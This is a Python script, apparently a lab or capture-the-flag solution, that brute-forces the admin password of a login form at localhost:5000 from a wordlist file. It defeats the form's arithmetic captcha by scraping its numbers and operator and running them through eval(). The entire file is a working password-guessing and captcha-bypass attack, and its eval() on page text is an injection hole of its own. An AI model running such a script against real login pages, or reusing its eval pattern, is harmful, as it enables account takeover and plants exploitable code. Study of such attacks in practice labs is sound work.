from urllib.request import urlopen
from requests import post
import re

url = "http://localhost:5000/login/"


def get_content_from_class(html, class_name):
    pattern = f'<div class="{class_name}">.*?</div>'
    match_results = re.search(pattern, html, re.IGNORECASE)
    content = match_results.group()
    content = re.sub("<.*?>", "", content)  # Remove HTML tags
    return content


def login(password):
    page = urlopen(url)

    if page.getcode() != 200:
        print("Error")
        return

    html_bytes = page.read()
    html = html_bytes.decode("utf-8")

    n1 = get_content_from_class(html, "n1")
    n2 = get_content_from_class(html, "n2")
    op = get_content_from_class(html, "op")

    captcha = eval(n1 + op + n2)

    login_body = {
        "username": "admin",
        "password": password,
        "captcha": captcha
    }

    res = post(url, json=login_body)
    return res.json()


with open("passwords.txt", "r") as f:
    passwords = f.readlines()
    # remove \n
    passwords = [password.strip() for password in passwords]
    # loop through passwords
    print("Trying passwords...")
    found = False
    for password in passwords:
        res = None
        while True:
            try:
                res = login(password)
            except:
                continue
            break
        if "message" in res:
            print("Password found: ", password)
            found = True
            break
    if not found:
        print("Password not found")
